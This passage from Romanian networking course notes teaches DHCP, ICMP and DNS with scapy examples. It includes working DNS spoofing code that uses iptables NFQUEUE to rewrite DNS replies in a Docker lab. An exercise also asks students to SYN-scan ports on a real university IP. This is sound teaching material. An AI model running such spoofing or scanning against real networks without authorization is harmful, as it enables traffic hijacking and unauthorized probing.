- [bootstrap protocol](https://en.wikipedia.org/wiki/Bootstrap_Protocol) a fost înlocuit de [Dynamic Host Configuration Protocol](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol#Operation) pentru asignarea de adrese IPv4 automat device-urilor care se conectează pe rețea
- pentru cerere de IP flow-ul include pașii pentru discover, offer, request și ack
- container de docker [aici](https://github.com/networkboot/docker-dhcpd)
- [exemplu de cod scapy aici](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/src/examples/dhcp.py)

<a name="scapy_icmp"></a> 
### [Internet Control Message Protocol (ICMP)](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages)

Am discutat despre ICMP și ping pentru a verifica dacă două device-uri pot comunica unul cu altul. Principala funcție a protocolului ICMP este de [a raprota erori](https://www.cloudflare.com/learning/ddos/glossary/internet-control-message-protocol-icmp/) iar [mesajele de control](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages) pot varia de la faptul că un host, port sau protocol este inaccesibil până la notificarea că TTL a expirat în tranzit.

```python
ICMP().show()
###[ ICMP ]### 
  type= echo-request
  code= 0
  chksum= None
  id= 0x0
  seq= 0x0

# facem un pachet echo-request, ping
icmp = ICMP(type = 'echo-request')
ip = IP(dst = "137.254.16.101")
pachet = ip / icmp

# folosim sr1 pentru send și un reply
rec = sr1(pachet)
rec.show()

###[ IP ]### 
  version= 4
  ihl= 5
  tos= 0x0
  len= 28
  id= 48253
  flags= DF
  frag= 0
  ttl= 242
  proto= icmp
  chksum= 0x23e7
  src= 137.254.16.101
  dst= 1.15.3.1
  \options\
###[ ICMP ]### 
     type= echo-reply
     code= 0
     chksum= 0x0
     id= 0x0
     seq= 0x0
```

<a name="scapy_dns"></a> 
### [Domain Name System](https://dnsmonitor.com/dns-tutorial-1-the-basics/)

Aici puteți găsi ilustrate informații despre [DNS și DNS over HTTPS](https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/). 
În general, numele care corespund unui server ([Fully Qualified Domain Names](https://kb.iu.edu/d/aiuv)) sunt salvate cu [un punct în plus la sfârșit](https://stackexchange.github.io/dnscontrol/why-the-dot).
În linux există aplicația `dig` cu care putem interoga entries de DNS:
```bash
# interogam serverul 8.8.8.8 pentur a afla la ce IP este fmi.unibuc.ro
dig @8.8.8.8 fmi.unibuc.ro

; <<>> DiG 9.10.3-P4-Ubuntu <<>> @8.8.8.8 fmi.unibuc.ro
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16808
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;fmi.unibuc.ro.         IN  A

;; ANSWER SECTION:
fmi.unibuc.ro.      12925   IN  A   193.226.51.15

;; Query time: 39 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Wed May 13 13:29:13 EEST 2020
;; MSG SIZE  rcvd: 58

```
DNS stochează nu doar informații despre IP-ul corespunzător unui hostname, ci există mai multe tipuri de intrări ([record types](https://ns1.com/resources/dns-types-records-servers-and-queries)) în baza de date:

- A record / Address Mapping - stochează perechi de NUME - IPv4
- AAAA Record - similar cu A, pentru adrese IPv6
- CNAME / Canonical Name - are rolul de a face un alias între un hostname existent și un alt hostname, ex: nlp.unibuc.ro -> nlp-unibuc.github.io
- MX / Mail Exchanger - spcifică server de email SMTP pentru domeniu, încercați `dig @8.8.8.8 fmi.unibuc.ro MX`
- NS / Name Server - specifică ce Authoritative Name Server este responabil pentru o anumită zonă de DNS (ex., pentru fmi.unibuc.ro este ns1.fmi.unibuc.ro), încercați `dig @8.8.8.8 fmi.unibuc.ro NS`
- PTR / Reverse-lookup Pointer - permite interogarea in functie de IP pentru a afla numele
- TXT / Text data - conține informații care pot fi procesate de alte servicii, `dig @8.8.8.8 fmi.unibuc.ro TXT`
- SOA / Start of Authority - conține informații despre autoritatea care se ocupă de acest nume

Protocolul pentru DNS lucrează la nivelul aplicației și este standardizat pentru UDP, port 53. Acesta se bazează pe request-response iar în cazul în care nu se primesc răspunsuri după un număr de reîncercări (de multe ori 2), programul anunță că nu poate găsi IP-ul pentru hostname-ul cerut ("can'r resolve"). Headerul protocolului [este definit aici](http://www.networksorcery.com/enp/protocol/dns.htm).

<a name="scapy_dns_request"></a> 
#### Exemplu DNS request
```python
from scapy.all import *

# DNS request către google DNS
ip = IP(dst = '8.8.8.8')
transport = UDP(dport = 53)

# rd = 1 cod de request
dns = DNS(rd = 1)

# query pentru a afla entry de tipul 
dns_query = DNSQR(qname=b'fmi.unibuc.ro.', qtype=1, qclass=1)
dns.qd = dns_query

answer = sr1(ip / transport / dns)
print (answer[DNS].summary())
```

<a name="scapy_dns_server"></a> 
#### Micro DNS Server
Putem scrie un mic exemplu de aplicație care să funcționeze ca DNS care returnează [DNS A records](https://support.dnsimple.com/articles/a-record/). DNS rulează ca UDP pe portul 53:
```python
simple_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
simple_udp.bind(('0.0.0.0', 53))

while True:
    request, adresa_sursa = simple_udp.recvfrom(65535)
    # converitm payload-ul in pachet scapy
    packet = DNS(request)
    dns = packet.getlayer(DNS)
    if dns is not None and dns.opcode == 0: # dns QUERY
        print ("got: ")
        print (packet.summary())
        dns_answer = DNSRR(      # DNS Reply
           rrname=dns.qd.qname, # for question
           ttl=330,             # DNS entry Time to Live
           type="A",            
           rclass="IN",
           rdata='1.1.1.1')     # found at IP: 1.1.1.1 :)
        dns_response = DNS(
                          id = packet[DNS].id, # DNS replies must have the same ID as requests
                          qr = 1,              # 1 for response, 0 for query 
                          aa = 0,              # Authoritative Answer
                          rcode = 0,           # 0, nicio eroare http://www.networksorcery.com/enp/protocol/dns.htm#Rcode,%20Return%20code
                          qd = packet.qd,      # request-ul original
                          an = dns_answer)     # obiectul de reply
        print('response:')
        print (dns_response.summary())
        simple_udp.sendto(bytes(dns_response), adresa_sursa)
simple_udp.close()
```

Testați-l cu
```bash
dig @localhost fmi.unibuc.ro
```

<a name="scapy_dns_spoofing"></a> 
#### DNS Spoofing
Dacă intermediem conexiunea între două noduri, putem insera răspunsuri DNS malițioase cu scopul de a determina userii să acceseze pagini false. Pe linux, un DNS customizabil se poate set prin fișierul `/etc/resolv.conf` sau ca în [exemplul de aici](https://unix.stackexchange.com/questions/128220/how-do-i-set-my-dns-when-resolv-conf-is-being-overwritten)).

Presupunem că folosim configurația de containere definită în acest capitol, că ne aflăm pe containerul `router` și că monitorizăm toate cererile containerul `server`. În cazul în care observăm un pachet UDP cu portul destinație 53 (e.g., IP destinație 8.8.8.8), putem încerca să trimitem un reply care să pară că vine de la DNS (8.8.8.8) cu o adresă IP falsă care nu apraține numelui interogat de către server. 
E posibil ca reply-ul nostru să ajungă la containerul `server`, dar și reply-ul serverul DNS original (8.8.8.8) să ajungă tot la container. Pentru ca atacul să fie cât mai lin, cel mai sigur este să modificăm live răspunsurile DNS-ului original (8.8.8.8) după următoarele instrucțiuni ([sursa originală](https://www.thepythoncode.com/article/make-dns-spoof-python)):

##### 1. iptables forward către nfqueue
Ne atașăm containerului `router` pentru a ataca containerul `server`. Construim o regulă de iptables prin care toate pachetele care trebuie forwardate (-I FORWARD) să treacă prin regula NFQUEUE cu număr de identificare 10 (putem alege orice număr).
```bash
docker-compose exec router bash

iptables -I FORWARD -j NFQUEUE --queue-num 10
```
##### 2. Scriem o funcție care detectează și modifică pachete de tip DNS reply
Deschidem un terminal de python sau scriem codul într-un fișier pe care îl executăm:
```python
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os

def detect_and_alter_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    # if the packet is a DNS Resource Record (DNS reply)
    # modify the packet
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(UDP) and scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        scapy_packet = alter_packet(scapy_packet)
        print("[After ]:", scapy_packet.summary())
        # put it back in the queue in the form of octets
        packet.set_payload(bytes(scapy_packet))
    # accept the packet in the queue
    packet.accept()


def alter_packet(packet):
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    # daca nu e site-ul fmi, returnam fara modificari
    if qname != b'fmi.unibuc.ro.':
        return packet
    # construim un nou raspuns cu rdata
    packet[DNS].an = DNSRR(rrname=qname, rdata='1.1.1.1')
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

```

##### 3. Executăm coada Netfilter cu funcția definită anterior
```python
queue = NFQ()
queue.bind(10, detect_and_alter_packet)
queue.run()
queue.unbind()
```


<a name="exercitii"></a> 
## Exerciții
1. Instanțiați un server UDP și faceți schimb de mesaje cu un client scapy.
2. Rulați 3-way handshake între server și client folosind containerele definite în capitolul3, astfel: containerul `server` va rula `capitolul2/tcp_server.py` pe adresa '0.0.0.0', iar în containerul `client` configurați și rulați fișierul din [capitolul3/src/examples/tcp_handshake.py](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/src/examples/tcp_handshake.py) pentru a face 3-way handshake.
3. Configurați opțiunea pentru Maximum Segment Size (MSS) astfel încat să îl notificați pe server că segmentul maxim este de 1 byte. Puteți să-l configurați cu 0?
4. Trimiteți mesaje TCP folosind flag-ul PSH și scapy.
5. Setați flag-urile ECN în IP și flag-ul ECE in TCP pentru a notifica serverul de congestionarea rețelei.
6. [TCP Syn Scanning](https://scapy.readthedocs.io/en/latest/usage.html#syn-scans) - folosiți scapy pentru a crea un pachet cu IP-ul destinație 193.226.51.6 (site-ul facultății) și un layer de TCP cu dport=(10, 500) pentru a afla care porturi sunt deschise comunicării cu TCP pe site-ul facultății.
7. Urmăriți mai multe exemple din scapy [aici](https://scapy.readthedocs.io/en/latest/usage.html#simple-one-liners)
8. Utilizați NetfilterQueue în containerul `router` pentru a intercepta pachete TCP dintre client și server și pentru a injecta mesaje suplimentare în comunicare.
